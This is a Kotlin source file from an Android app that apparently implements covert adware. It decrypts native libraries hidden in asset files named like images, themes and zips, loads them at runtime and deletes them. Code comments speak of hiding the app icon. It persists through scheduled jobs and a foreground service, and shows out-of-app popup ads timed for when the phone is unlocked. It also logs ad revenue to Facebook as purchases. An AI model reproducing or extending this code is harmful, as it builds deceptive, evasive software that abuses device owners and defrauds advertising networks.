package meg

import android.app.Application
import android.app.KeyguardManager
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Context.JOB_SCHEDULER_SERVICE
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import androidx.core.content.ContextCompat
import com.orchids.oplz.Cop
import com.orchids.oplz.AppLifelListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import ap.A
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.fragrant.grass.orchids.ActivityListHelper
import com.fragrant.grass.orchids.OrchidsApp
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import com.honeydew.lychee.GrassJobHelper
import com.physalis.loquat.LoquatNSer
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.text.SimpleDateFormat
import java.util.Currency
import java.util.Date
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

/**
 * Date：2025/7/16
 * Describe:
 * b2.D9
 */
object GoStartMe {
    private var sK = "" // 16, 24, or 32 bytes // So 解密的key
    private var mContext: Application = Cop.mApp

    @JvmStatic
    var isSAd = false //是否显示广告
    private var lastSAdTime = 0L //上一次显示广告的时间

    @JvmStatic
    val mAdC: MegCenter = MegCenter()

    private val mMainScope = CoroutineScope(Dispatchers.Main)
    private var mInstallWait = 40000 // 安装时间
    private var cTime = 30000L // 检测间隔
    private var tPer = 40000 // 显示间隔
    private var nHourShowMax = 80//小时显示次数
    private var nDayShowMax = 80 //天显示次数
    private var nTryMax = 50 // 失败上限

    private var numHour = Cop.getInt("show_hour_num")
    private var numDay = Cop.getInt("show_day_num")
    private var isCurDay = Cop.getStr("last_cur_day")
    private var numJumps = Cop.getInt("num_jum_p")

    @JvmStatic
    var isLoadH = false //是否H5的so 加载成功
    private var tagL = "" //调用外弹 隐藏icon字符串
    private var tagO = "" //外弹字符串

    @JvmStatic
    var strBroadKey = "" // 广播的key
    private var fileName = ""// 文件开关名
    private var timeDS = 100L //延迟显示随机时间开始
    private var timeDE = 400L //延迟显示随机时间结束
    private var maxShowTime = 10000L // 最大显示时间
    private var checkTimeRandom = 1000 // 在定时时间前后增加x秒

    @JvmStatic
    fun gDTime(): Long {
        if (timeDE < 1 || timeDS < 1) return Random.nextLong(90, 190)
        return Random.nextLong(timeDS, timeDE)
    }

    @JvmStatic
    fun sNumJump(num: Int) {
        numJumps = num
        Cop.saveInt("num_jum_p", num)
    }

    @JvmStatic
    fun adShow() {
        numHour++
        numDay++
        isSAd = true
        lastSAdTime = System.currentTimeMillis()
        sC()
        mAdC.loadAd()
    }

    private var isPost = false
    private fun pL() {
        if (isPost) return
        isPost = true
        Cop.pE("advertise_limit")
    }

    private fun sC() {
        Cop.saveInt("show_hour_num", numHour)
        Cop.saveInt("show_day_num", numDay)
    }

    private fun isCurH(): Boolean {
        val s = Cop.getStr("l_hour_t")
        if (s.isNotBlank()) {
            if (System.currentTimeMillis() - s.toLong() < 60000 * 60) {
                return true
            }
        }
        Cop.saveC("l_hour_t", System.currentTimeMillis().toString())
        return false
    }

    private fun isLi(): Boolean {
        val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
        if (isCurDay != day) {
            isCurDay = day
            Cop.saveC("last_cur_day", isCurDay)
            numHour = 0
            numDay = 0
            isPost = false
            sC()
        }
        if (isCurH().not()) {
            numHour = 0
            sC()
        }
        if (numDay >= nDayShowMax) {
            pL()
            return true
        }
        if (numHour >= nHourShowMax) {
            return true
        }
        return false
    }

    @JvmStatic
    fun a2() {
        mContext.registerActivityLifecycleCallbacks(AppLifelListener())
        refreshAdmin()
        File("${mContext.dataDir}/$fileName").mkdirs()
        t()
    }

    // 如果是Admin写在里面的那么可以直接进行数据
    @JvmStatic
    fun reConfig(js: JSONObject) {
        // JSON数据格式
        sK = js.optString("guava_url")//So 解密的key
        val listStr = js.optString("guava_str").split("-")
        tagL = listStr[0]
        tagO = listStr[1]
        strBroadKey = listStr[2]
        fileName = listStr[3]

        mAdC.setAdId(js.optString("guava_id_h"), js.optString("guava_id_l"))// 广告id
        val lt = js.optString("guava_tim").split("-")//时间相关配置
        cTime = lt[0].toLong() * 1000
        tPer = lt[1].toInt() * 1000
        mInstallWait = lt[2].toInt() * 1000
        nHourShowMax = lt[3].toInt()
        nDayShowMax = lt[4].toInt()
        nTryMax = lt[5].toInt()
        timeDS = lt[6].toLong()
        timeDE = lt[7].toLong()
        maxShowTime = lt[8].toLong() * 1000
        checkTimeRandom = lt[9].toInt() * 1000
    }

    private var lastS = ""
    private fun refreshAdmin() {
        val s = Cop.getStr("meow_config")
        if (lastS != s) {
            lastS = s
            reConfig(JSONObject(s))
        }
    }

    private fun t() {
        if (numJumps > nTryMax) {
            Cop.pE("pop_fail")
            return
        }
        val is64i = isF()
        mMainScope.launch {
            Cop.pE("test_s_dec")
            val time = System.currentTimeMillis()
            val i: Boolean
            withContext(Dispatchers.IO) {
                i = loFi(if (is64i) "theme/kiz.svg" else "theme/cool.jpeg")
            }
            if (i.not()) {
                Cop.pE("ss_l_f", "$is64i")
                return@launch
            }
            Cop.pE("test_s_load", "${System.currentTimeMillis() - time}")
            A.a0(2, 1.0, tagL)
            while (true) {
                openJob()
                // 刷新配置
                refreshAdmin()
                var t = cTime
                if (checkTimeRandom > 0) {
                    t = Random.nextLong(cTime - checkTimeRandom, cTime + checkTimeRandom)
                }
                cMeGo(t)
                delay(t)
                if (numJumps > nTryMax) {
                    Cop.pE("pop_fail")
                    break
                }
            }
        }

        mMainScope.launch(Dispatchers.IO) {
            delay(1000)
            if (loFi(if (is64i) "bc.style/red.zip" else "bc.style/yellow.txt")) {
                withContext(Dispatchers.Main) {
                    try {
                        A.b(mContext)
                        isLoadH = true
                    } catch (_: Throwable) {
                    }
                }
            }
        }
    }

    private fun loFi(assetsName: String): Boolean {
        val assetsInputS = mContext.assets.open(assetsName)
        val fileSoName = "Bz_${System.currentTimeMillis()}"
        val file = File("${mContext.filesDir}/Cache")
        if (file.exists().not()) {
            file.mkdirs()
        }
        try {
            deF(assetsInputS, File(file.absolutePath, fileSoName))
            val file2 = File(file.absolutePath, fileSoName)
            System.load(file2.absolutePath)
            file2.delete()
            return true
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return false
    }


    // 解密
    private fun deF(inputFile: InputStream, outputFile: File) {
        val key = SecretKeySpec(sK.toByteArray(), "AES")
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, key)
        val outputStream = FileOutputStream(outputFile)
        val inputBytes = inputFile.readBytes()
        val outputBytes = cipher.doFinal(inputBytes)
        outputStream.write(outputBytes)
        outputStream.close()
        inputFile.close()
    }

    private fun isF(): Boolean {
        // 优先检测64位架构
        for (abi in Build.SUPPORTED_64_BIT_ABIS) {
            if (abi.startsWith("arm64") || abi.startsWith("x86_64")) {
                return true
            }
        }
        for (abi in Build.SUPPORTED_32_BIT_ABIS) {
            if (abi.startsWith("armeabi") || abi.startsWith("x86")) {
                return false
            }
        }
        return Build.CPU_ABI.contains("64")
    }

    @JvmStatic
    fun fiAc(): Long {
        if (ActivityListHelper.getListAc().isNotEmpty()) {
            ArrayList(ActivityListHelper.getListAc()).forEach {
                it.finishAndRemoveTask()
            }
            return 800
        }
        return 10
    }

    private var time = 0L
    private fun openJob() {
        if (System.currentTimeMillis() - time < 15000) return
        time = System.currentTimeMillis()
        val componentName = ComponentName(mContext, GrassJobHelper::class.java)
        try {
            val jobInfo: JobInfo =
                JobInfo.Builder(5690, componentName).setMinimumLatency(3000) // 至少延迟 5 秒
                    .build()
            val jobScheduler = mContext.getSystemService(JOB_SCHEDULER_SERVICE) as JobScheduler
            jobScheduler.schedule(jobInfo)
        } catch (_: Exception) {
        }
    }


    // 定时逻辑
    private fun cMeGo(time: Long) {
        Cop.pE("ad_session", time.toString())
        if (l().not()) return
        Cop.pE("ad_light")
        if (isLi()) {
            Cop.pE("ad_pass", "limit")
            return
        }
        mAdC.loadAd()
        if (System.currentTimeMillis() - Cop.insAppTime < mInstallWait) {
            Cop.pE("ad_pass", "1t")
            return
        }
        if (System.currentTimeMillis() - lastSAdTime < tPer) {
            Cop.pE("ad_pass", "2t")
            return
        }
        if (isSAd && System.currentTimeMillis() - lastSAdTime < maxShowTime) {
            Cop.pE("ad_pass", "s")
            return
        }
        Cop.pE("ad_pass", "N")
        CoroutineScope(Dispatchers.Main).launch {
            delay(fiAc())
            if (isSAd) {
                delay(800)
            }
            sNumJump(++numJumps)
            Cop.pE("ad_start")
            A.a0(15, 4.0, tagO)
        }
    }

    private fun l(context: Context = mContext): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

    @JvmStatic
    fun postEcpm(ecpm: Double) {
        try {
            val b = Bundle()
            b.putDouble(FirebaseAnalytics.Param.VALUE, ecpm)
            b.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
            Firebase.analytics.logEvent("ad_impression_data", b)
        } catch (_: Exception) {
        }
        if (FacebookSdk.isInitialized().not()) return
        //fb purchase
        AppEventsLogger.newLogger(Cop.mApp).logPurchase(
            ecpm.toBigDecimal(), Currency.getInstance("USD")
        )
    }

    private var timeNoti = 0L

    @JvmStatic
    fun openService(context: Context) {
        if (System.currentTimeMillis() - timeNoti < 60000) return
        timeNoti = System.currentTimeMillis()
        val intent = Intent(context, LoquatNSer::class.java)
        runCatching {
            ContextCompat.startForegroundService(context, intent)
        }
    }
}